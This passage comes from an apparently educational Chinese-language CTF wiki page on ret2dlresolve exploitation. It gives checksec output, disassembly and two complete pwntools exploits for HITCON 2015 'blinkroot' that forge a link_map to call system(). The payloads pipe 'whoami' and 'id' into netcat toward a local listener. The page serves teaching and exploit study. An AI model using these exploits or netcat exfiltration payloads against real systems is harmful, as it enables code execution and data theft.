    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>execve_number</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0xc2</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&quot;__main__&quot;</span><span class=p>:</span>
    <span class=c1># bruteforce()</span>
    <span class=n>exp</span><span class=p>()</span>
</code></pre></div> <h2 id=2015-hitcon-quals-blinkroot>2015-hitcon-quals-blinkroot<a class=headerlink href=#2015-hitcon-quals-blinkroot title="Permanent link">&para;</a></h2> <p>簡單看一下程序開的保護</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>checksec<span class=w> </span>blinkroot
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>No<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>發現程序開啓了 Canary 保護。</p> <p>程序的基本邏輯爲</p> <ul> <li>在 bss 指定位置處讀取 1024 個字節</li> <li>關閉標準輸入，標準輸出，標準錯誤輸出。</li> <li>然後可以在任意 16 字節對齊地址處設置16個字節，其中低8字節固定爲 0x10，高 8 字節完全可控。</li> </ul> <p>顯然這裏是沒有信息泄露的，當然我們沒有辦法覆蓋返回地址來控制程序的執行流。但是既然程序沒有開啓 RELRO 保護，我們可以考慮修改 ELF 文件的字符串表。同時我們觀察到</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>__noreturn</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>recvlen</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>data</span><span class=p>,</span><span class=w> </span><span class=mh>0x400uLL</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1024</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
<span class=w>    </span><span class=o>*</span><span class=p>(</span><span class=kr>__m128</span><span class=w> </span><span class=o>*</span><span class=p>)((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>data</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>data</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_mm_loadh_ps</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dbl_600BC8</span><span class=p>);</span>
<span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=n>_exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div> <p>程序會執行 puts 函數，而 puts 函數的具體地址爲 data 變量偏移 0x10。</p> <div class=highlight><pre><span></span><code>.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends
</code></pre></div> <p>因此，我們可以控制 s 爲 /bin/sh，同時控制字符串表中的 puts 函數爲 system 函數，那就可以調用 system 函數了。然而，理想很好，但是，我們發現</p> <div class=highlight><pre><span></span><code>LOAD:00000000006009E8                 Elf64_Dyn &lt;5, 400340h&gt;  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn &lt;6, 400280h&gt;  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn &lt;0Ah, 69h&gt;    ; DT_STRSZ
</code></pre></div> <p>字符串表並不是 16 字節對齊的，因此不太行。那我們嘗試使用在開啓 Partial RELRO 下的思路吧。</p> <p>由於不能泄露地址信息，所以我們可以採用僞造 linkmap 的思路，即</p> <ul> <li>利用題目提供的任意寫的思路修改 linkmap 指向已經解析的地址</li> <li>通過題目中接下來將要調用的 puts 函數來實現劫持控制流的目的</li> </ul> <p>這裏我們可以發現 linkmap 存儲的地址爲 0x600B48，因此我們可以從 0x600B40 開始設置數據。</p> <div class=highlight><pre><span></span><code>.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
</code></pre></div> <p>此外，需要注意的是 puts 函數在重定位表中的索引爲 1。因此，在構造 linkmap 時需要注意。</p> <div class=highlight><pre><span></span><code>.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0
</code></pre></div> <p>利用腳本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>

<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
<span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    elf: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    known_function_ptr: a already known pointer of the function, e.g., elf.got[&#39;__libc_start_main&#39;]</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3</span>

<span class=sd>    WARNING: be careful that fake_linkmap is 0x100 bytes length   </span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1</span>

<span class=sd>    linkmap:</span>
<span class=sd>        0x00: l_addr = offset_of_two_addr</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span>
<span class=sd>        0x08: 17, tag of the JMPREL</span>
<span class=sd>        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span>
<span class=sd>        0x18: padding for the relocation entry of idx=0</span>
<span class=sd>        0x20: padding for the relocation entry of idx=0</span>
<span class=sd>        0x28: padding for the relocation entry of idx=0</span>
<span class=sd>        0x30: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0x38: r_info</span>
<span class=sd>        0x40: append    </span>
<span class=sd>      resolved addr</span>
<span class=sd>        0x48: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50</span>
<span class=sd>        0x50: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0x50</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x8</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
    <span class=c1># here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x48</span> <span class=o>-</span> <span class=n>offset_of_two_addr</span><span class=p>)</span>
                   <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>known_function_ptr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x50</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>

    <span class=k>return</span> <span class=n>linkmap</span>

<span class=c1># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class=c1># .got.plt:0000000000600B48 qword_600B48    dq 0    </span>
<span class=n>target_addr</span> <span class=o>=</span> <span class=mh>0x600B40</span>
<span class=n>data_addr</span> <span class=o>=</span> <span class=mh>0x600BC0</span>
<span class=n>offset</span> <span class=o>=</span> <span class=n>target_addr</span><span class=o>-</span><span class=n>data_addr</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>data_addr</span><span class=o>+</span><span class=mi>43</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=s2>&quot;whoami | nc 127.0.0.1 8080</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=n>payload</span> <span class=o>+=</span><span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>data_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>],</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;system&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>需要注意這裏的 <code>data_addr+43</code> 爲僞造的 linkmap 的地址。執行效果如下</p> <div class=highlight><pre><span></span><code>❯ nc -l 127.0.0.1 8080
iromise
</code></pre></div> <p>上面的這種方式爲僞造 link_map 的 l_addr 爲目標函數和已解析函數之間的偏移。</p> <p>根據之前的介紹，我們還可以僞造 l_addr 爲已解析函數的地址， st_value 爲已解析函數和目標函數之間的偏移。</p> <div class=highlight><pre><span></span><code>value = l-&gt;l_addr + sym-&gt;st_value
</code></pre></div> <p>這裏，由於 <code>.got.plt</code> 的下方沒多遠就是 bss 段 data 的位置。當我們控制 linkmap 的地址位於 got 表附近時，同時我們還需要利用 link_map 的幾個動態表指針，偏移從 0x68 開始。因此我們需要仔細構造對應的數據。這裏我們選擇僞造 link_map 到 0x600B80。</p> <div class=highlight><pre><span></span><code>0x600B80--&gt;link_map
0x600BC0--&gt;data    
0x600BC8--&gt;data+8
0x600BD0--&gt;data+16, args of puts
0x600BE8--&gt;data+24
</code></pre></div> <p>因此，我們可以控制的 puts 的參數的長度最大爲 0x18。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
<span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    libc: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1</span>

<span class=sd>    linkmap:</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0xc0</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78</span>
<span class=sd>        0x78: 17, tag of the JMPREL</span>
<span class=sd>        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x88</span>
<span class=sd>        0x88: padding for the relocation entry of idx=0</span>
<span class=sd>        0x90: padding for the relocation entry of idx=0</span>
<span class=sd>        0x98: padding for the relocation entry of idx=0</span>
<span class=sd>        0xa0: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0xa8: r_info</span>
<span class=sd>        0xb0: append</span>
<span class=sd>      resolved addr</span>
<span class=sd>        0xb8: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0</span>
<span class=sd>        0xc0: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0</span>
<span class=sd>      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0</span>
<span class=sd>        0xd0: 0x0000030000000000</span>
<span class=sd>        0xd8: offset_of_two_addr</span>
<span class=sd>        0xe0: fake st_size</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x78</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=o>+</span><span class=mh>0xc0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x88</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
    <span class=c1># here we set p_r_offset = libc.sym[&quot;__free_hook&quot;]-libc.sym[&quot;__libc_start_main&quot;]</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = __libc_start_main_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__free_hook&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0xd0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0000030000000000</span><span class=p>)</span> <span class=o>+</span> \
        <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=o>-</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x78</span><span class=p>)</span>

    <span class=k>return</span> <span class=n>linkmap</span>


<span class=c1># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class=c1># .got.plt:0000000000600B48 qword_600B48    dq 0</span>
<span class=n>target_addr</span> <span class=o>=</span> <span class=mh>0x600B40</span>
<span class=n>data_addr</span> <span class=o>=</span> <span class=mh>0x600BC0</span>
<span class=n>offset</span> <span class=o>=</span> <span class=n>target_addr</span><span class=o>-</span><span class=n>data_addr</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=s2>&quot;id|nc 127.0.0.1 8080</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>],</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;system&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>需要注意的是，在僞造 linkmap 的時候，我們是從偏移 0x68 開始構造的，所以在最後對齊的時候設置 <code>linkmap.ljust(0xf8-0x68, 'A')</code>。</p> <p>執行效果</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>nc<span class=w> </span>-l<span class=w> </span><span class=m>127</span>.0.0.1<span class=w> </span><span class=m>8080</span>
<span class=nv>uid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>iromise<span class=o>)</span><span class=w> </span><span class=nv>gid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>iromise<span class=o>)</span>...
</code></pre></div> <h2 id=_6>總結<a class=headerlink href=#_6 title="Permanent link">&para;</a></h2> <table> <thead> <tr> <th></th> <th>修改 dynamic 節的內容</th> <th>修改重定位表項的位置</th> <th>僞造 linkmap</th> </tr> </thead> <tbody> <tr> <td>主要前提要求</td> <td>無</td> <td>無</td> <td>無信息泄漏時需要 libc</td> </tr> <tr> <td>適用情況</td> <td>NO RELRO</td> <td>NO RELRO, Partial RELRO</td> <td>NO RELRO, Partial RELRO</td> </tr> <tr> <td>注意點</td> <td></td> <td>確保版本檢查通過；確保重定位位置可寫；確保重定位表項、符號表、字符串表一一對應</td> <td>確保重定位位置可寫；需要着重僞造重定位表項、符號表；</td> </tr> </tbody> </table> <p>總的來說，與 ret2dlresolve 攻擊最爲相關的一些動態節爲</p> <ul> <li>DT_JMPREL</li> <li>DT_SYMTAB</li> <li>DT_STRTAB</li> <li>DT_VERSYM</li> </ul> <h2 id=_7>題目<a class=headerlink href=#_7 title="Permanent link">&para;</a></h2> <ul> <li>pwnable.kr unexploitable</li> <li>pwnable.tw unexploitable</li> <li>0CTF 2018 babystack</li> <li>0CTF 2018 blackhole</li> </ul> <h2 id=_8>參考<a class=headerlink href=#_8 title="Permanent link">&para;</a></h2> <ol> <li><a href=http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ >http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> ，深入淺出。</li> <li><a href=https://www.math1as.com/index.php/archives/341/ >https://www.math1as.com/index.php/archives/341/</a></li> <li><a href=https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ >https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li> <li><a href=https://blog.csdn.net/seaaseesa/article/details/104478081>https://blog.csdn.net/seaaseesa/article/details/104478081</a></li> <li><a href=https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md>https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md</a></li> <li><a href=https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot>https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot</a></li> </ol> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../advanced-rop/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> 高級 ROP </div> </div> </a> <a href=../ret2vdso/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> ret2VDSO </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 